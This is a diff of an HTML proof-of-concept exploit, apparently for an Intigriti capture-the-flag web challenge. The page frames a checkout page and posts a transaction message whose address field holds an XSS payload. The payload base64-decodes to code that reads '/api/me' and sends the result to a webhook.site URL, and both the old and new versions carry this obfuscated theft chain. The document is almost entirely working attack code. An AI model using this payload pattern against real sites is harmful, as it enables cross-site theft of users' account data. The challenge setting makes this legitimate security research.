@@ -5,31 +5,30 @@
 
   <body>
     <h1>OOO PoC OOO</h1>
-    <script>
-    fetch('https://webhook.site/1260e73e-c943-4c4a-96a4-d1523ad42027');
-    setTimeout(() => {
-  iframe.contentWindow.postMessage({
-    type: 'submitTransaction',
-    transaction: {
-      currency: '1337COIN', 
-      amount: 1,
-      toAddress: '<img src=flag onerror="eval(atob(`ZmV0Y2goIi9hcGkvbWUiKS50aGVuKHJlcyA9PiByZXMuanNvbigpKS50aGVuKGRhdGEgPT4gZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzEyNjBlNzNlLWM5NDMtNGM0YS05NmE0LWQxNTIzYWQ0MjAyNy9mbGFnPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZGF0YSkpKQ==`))">'
-    }
-  }, '*');
-}, 3000);
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  const iframe = document.getElementById('checkoutFrame');
 
-  
+  fetch('https://webhook.site/1260e73e-c943-4c4a-96a4-d1523ad42027/flag');
 
-    </script>
-  <iframe src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001"
-onload="this.contentWindow.postMessage({
-    type: 'submitTransaction',
-    transaction: {
+  setTimeout(() => {
+    iframe.contentWindow.postMessage({
+      type: 'submitTransaction',
+      transaction: {
         currency: '1337COIN',
         amount: 1,
-        toAddress: '<img src=x onerror=alert(`0xk7edr`)>'
-    }
-}, '*')">
+        toAddress: '<img src=flag onerror="eval(atob(`ZmV0Y2goIi9hcGkvbWUiKQogIC50aGVuKHIgPT4gci5qc29uKCkpCiAgLnRoZW4oZCA9PiB7CiAgICBjb25zdCBwYXlsb2FkID0gZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGQpKTsKICAgIGZldGNoKCJodHRwczovL3dlYmhvb2suc2l0ZS8xMjYwZTczZS1jOTQzLTRjNGEtOTZhNC1kMTUyM2FkNDIwMjcvP2ZsYWc9IiArIHBheWxvYWQpOwogIH0pOwo=`))">'
+      }
+    }, '*');
+  }, 3000);
+});
+</script>
+
+<iframe
+  id="checkoutFrame"
+  src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001">
+</iframe>
+
 
     
 </iframe>
